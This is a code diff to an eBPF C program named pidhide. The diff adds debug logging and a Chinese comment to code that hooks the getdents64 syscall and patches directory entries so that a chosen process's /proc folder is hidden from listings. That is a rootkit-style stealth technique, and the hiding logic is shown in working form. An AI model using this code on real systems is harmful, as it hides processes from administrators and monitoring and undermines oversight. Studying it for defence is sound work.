@@ -5,6 +5,9 @@
 #include <bpf/bpf_core_read.h>
 #include "pidhide.h"
 
+#define my_bpf_printk(fmt, ...) \
+    bpf_printk("[PID_HIDE] " fmt, ##__VA_ARGS__)
+
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
 
 // Ringbuffer Map to pass messages from kernel to user
@@ -71,6 +74,15 @@ SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
+    // u32 pid = pid_tgid >> 32;
+    // u32 tid = (u32)pid_tgid;
+
+    // 调试信息
+    // my_bpf_printk("DEBUG: Entry - PID: %d, TID: %d, Hide PID: %d\n", 
+    //              pid, tid, cfg->pid_to_hide);
+
+    // my_bpf_printk("[handle_getdents_enter] DEBUG: - PID: %d, TID: %d, target_ppid: %d\n", pid, tid, target_ppid);
+
     // Check if we're a process thread of interest
     // if target_ppid is 0 then we target all pids
     if (target_ppid != 0)
@@ -97,10 +109,17 @@ SEC("tp/syscalls/sys_exit_getdents64")
 int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
+    u32 pid = pid_tgid >> 32;
+    u32 tid = (u32)pid_tgid;
+
     int total_bytes_read = ctx->ret;
+
+    my_bpf_printk("[sys_exit_getdents64] DEBUG: - PID: %d, TID: %d, total_bytes_read: %d\n", pid, tid, total_bytes_read);
+
     // if bytes_read is 0, everything's been read
     if (total_bytes_read <= 0)
     {
+        my_bpf_printk("[sys_exit_getdents64] WARN: bytes_read is 0, everything's been read");
         return 0;
     }
 
@@ -108,9 +127,15 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
     long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
     if (pbuff_addr == 0)
     {
+        my_bpf_printk("[sys_exit_getdents64] ERROR: Config not found\n");
         return 0;
     }
 
+    // 所有这些逻辑相当复杂，但本质上可以归结为：
+    // 在一个循环中反复调用 handle_getdents_exit，每次处理最多 200 个目录项的文件列表块，
+    // 检查其中是否存在一个名称等于当前进程 PID 的文件夹。
+    // 如果找到了该文件夹，就通过 bpf_tail_call 跳转到 handle_getdents_patch，
+    // 由它来执行实际的隐藏（patch）操作。
     // All of this is quite complex, but basically boils down to
     // Calling 'handle_getdents_exit' in a loop to iterate over the file listing
     // in chunks of 200, and seeing if a folder with the name of our pid is in there.
@@ -124,6 +149,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
 
     unsigned int bpos = 0;
     unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
+    my_bpf_printk("[sys_exit_getdents64] DEBUG: bpos:%d\n", bpos);
     if (pBPOS != 0)
     {
         bpos = *pBPOS;
@@ -201,10 +227,10 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
     char filename[MAX_PID_LEN];
     bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
     filename[pid_to_hide_len - 1] = 0x00;
-    bpf_printk("[PID_HIDE] filename previous %s\n", filename);
+    my_bpf_printk("filename previous %s\n", filename);
     bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
     filename[pid_to_hide_len - 1] = 0x00;
-    bpf_printk("[PID_HIDE] filename next one %s\n", filename);
+    my_bpf_printk("filename next one %s\n", filename);
 
     // Attempt to overwrite
     short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
